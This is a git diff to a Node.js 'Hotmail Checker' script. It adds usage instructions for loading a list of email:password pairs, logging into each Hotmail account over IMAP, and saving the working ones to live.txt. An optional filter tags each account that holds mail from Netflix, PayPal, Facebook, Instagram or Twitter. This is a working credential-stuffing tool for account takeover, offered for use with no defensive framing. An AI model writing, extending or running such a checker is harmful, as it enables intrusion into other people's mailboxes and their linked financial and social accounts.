@@ -1,3 +1,18 @@
+/**
+ * Hotmail Checker
+ * 
+ * Author: Tas33n
+ * Repository: https://github.com/tas33n/Hotmail-Checker.git
+ * License: MIT
+ * 
+ * Usage:
+ * - Clone the repository
+ * - Install dependencies using `npm install`
+ * - Prepare your email list in `mails.txt` in the format `email:password` (one per line)
+ * - Configure filters in `index.js`
+ * - Run the script using `node index.js`
+ */
+
 const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
@@ -6,7 +21,7 @@ const { ImapFlow } = require('imapflow');
 (async () => {
     const chalk = (await import('chalk')).default;
 
-    // Boolean values to enable/disable various filters
+    // Boolean values to enable/disable various filters, turning on filter will make the process slow so only turn them on if neccassary.
     const enableNetflixFilter = false;
     const enablePayPalFilter = false;
     const enableFacebookFilter = false;
@@ -73,8 +88,9 @@ const { ImapFlow } = require('imapflow');
                     console.log(chalk.red(`❌ 💨 ${email}`));
                 } else {
                     liveEmails.push(emailAndPass);
-                    fs.appendFileSync('live.txt', emailAndPass + '\n', 'utf8');
                     console.log(chalk.green(`✅ 💨 ${emailAndPass}`));
+
+                    let liveEntry = emailAndPass;
 
                     if (enableNetflixFilter || enablePayPalFilter || enableFacebookFilter || enableInstagramFilter || enableTwitterFilter) {
 
@@ -118,7 +134,6 @@ const { ImapFlow } = require('imapflow');
                                 if (hasNetflixMail && hasPayPalMail && hasFacebookMail && hasInstagramMail && hasTwitterMail) break;
                             }
 
-                            let liveEntry = emailAndPass;
                             if (hasNetflixMail) {
                                 liveEntry += ' | Netflix ✅';
                             }
@@ -134,6 +149,7 @@ const { ImapFlow } = require('imapflow');
                             if (hasTwitterMail) {
                                 liveEntry += ' | Twitter ✅';
                             }
+
                             fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                             console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));
 
